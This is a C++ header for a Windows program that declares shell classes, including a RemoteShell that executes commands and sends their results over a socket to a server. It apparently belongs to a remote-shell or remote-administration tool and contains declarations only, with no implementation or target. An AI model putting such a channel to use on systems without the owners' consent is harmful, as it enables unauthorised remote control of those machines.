#pragma once
#include <Windows.h>
#include <iostream>
#include <filesystem>
#include "Utils.h"
#include "Config.h"


// base class to provide common functionality of both local and remote shells 
class BaseShell
{
public:
	BaseShell() { IsRunAsAdmin ? m_CurrWorkingDirectory = "C:\\Windows\\System32" : m_CurrWorkingDirectory = GetProgramDir(); };
	bool ExecCommand(const std::string& UserInput);

protected:
	std::string m_CurrWorkingDirectory;
	std::string m_LastCommandResult;

private:
	virtual void DisplayCommandResult() = 0;
	virtual void DisplayError(const std::string& ErrorMessage) = 0;
	virtual void DisplayCurrentWorkingDirectory() = 0;
	bool ChangeDirectory(const std::string& TargetPath);
	bool CatFile(const std::string& TargetPath);
	bool ListDirectory(const std::string& TargetPath);
};

class LocalShell : public BaseShell
{
public:
	LocalShell() { std::cout << m_CurrWorkingDirectory << "> "; };
	virtual void DisplayCurrentWorkingDirectory() { std::cout << m_CurrWorkingDirectory << " ->" ; };
private:
	virtual void DisplayCommandResult() { std::cout  << m_LastCommandResult << std::endl; DisplayCurrentWorkingDirectory(); };
	virtual void DisplayError(const std::string& ErrorMessage) { std::cerr << ErrorMessage << std::endl; DisplayCurrentWorkingDirectory(); };


};

class RemoteShell : public BaseShell
{
public:
	RemoteShell(SOCKET ClientSocket) {m_socket = ClientSocket; send(ClientSocket, m_CurrWorkingDirectory.c_str(), m_CurrWorkingDirectory.size(), 0);};
	virtual void DisplayCurrentWorkingDirectory() { SendCommandResultServer(m_CurrWorkingDirectory); };

private:
	virtual void DisplayCommandResult() { SendCommandResultServer(m_LastCommandResult); };
	virtual void DisplayError(const std::string& ErrorMessage) { SendCommandResultServer(ErrorMessage); };
	bool SendCommandResultServer(const std::string& CommandResult);
	SOCKET m_socket;
};